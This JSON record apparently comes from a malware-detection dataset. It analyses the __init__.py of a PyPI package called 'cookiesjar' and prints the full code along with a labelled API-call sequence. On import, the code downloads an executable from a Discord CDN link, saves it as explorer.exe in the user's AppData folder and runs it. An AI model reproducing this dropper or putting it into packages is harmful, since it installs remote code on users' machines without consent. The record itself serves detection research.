[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/cookiesjar-0.0.1/cookiesjar-0.0.1/cookiesjar/__init__.py",
    "code_snippet": "import requests\nimport subprocess\nimport threading\nimport os\n\npath = os.environ[\"USERPROFILE\"] + \"\\AppData\\Local\\explorer.exe\"\n\ndef process() -> None:\n    if os.path.exists(path):\n        subprocess.run(path, shell=True)\n\ndef download() -> None:\n    response = requests.get(\"https://cdn.discordapp.com/attachments/1172852260624154634/1175535799211659304/PythonLIB_1.exe?ex=656b9606&is=65592106&hm=17cf4142bb148bca6ce38208f92fa46f986a0237d449180356208426176fb1bb&\")\n\n    if response.status_code != 200:\n        exit()\n\n    with open(path, 'wb') as file:\n        file.write(response.content)\n\ndef execute() -> None:\n    thread = threading.Thread(target=process)\n    thread.start()\n\ndownload(); execute()",
    "pattern_analysis": {
      "api_sequence": [
        "os.environ",
        "os.path.exists",
        "requests.get",
        "exit",
        "open",
        "file.write",
        "subprocess.run",
        "threading.Thread",
        "threading.Thread.start"
      ],
      "api_sequence_with_args": [
        "os.environ[\"USERPROFILE\"]",
        "os.path.exists(path)",
        "requests.get(\"https://cdn.discordapp.com/attachments/1172852260624154634/1175535799211659304/PythonLIB_1.exe?ex=656b9606&is=65592106&hm=17cf4142bb148bca6ce38208f92fa46f986a0237d449180356208426176fb1bb&\")",
        "exit()",
        "open(path, 'wb')",
        "file.write(response.content)",
        "subprocess.run(path, shell=True)",
        "threading.Thread(target=process)",
        "threading.Thread.start()"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "file.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "subprocess.run",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        }
      ],
      "contextual_code": "import requests\nimport subprocess\nimport threading\nimport os\n\npath = os.environ[\"USERPROFILE\"] + \"\\AppData\\Local\\explorer.exe\"\n\ndef process() -> None:\n    if os.path.exists(path):\n        subprocess.run(path, shell=True)\n\ndef download() -> None:\n    response = requests.get(\"https://cdn.discordapp.com/attachments/1172852260624154634/1175535799211659304/PythonLIB_1.exe?ex=656b9606&is=65592106&hm=17cf4142bb148bca6ce38208f92fa46f986a0237d449180356208426176fb1bb&\")\n\n    if response.status_code != 200:\n        exit()\n\n    with open(path, 'wb') as file:\n        file.write(response.content)\n\ndef execute() -> None:\n    thread = threading.Thread(target=process)\n    thread.start()\n\ndownload(); execute()"
    }
  }
]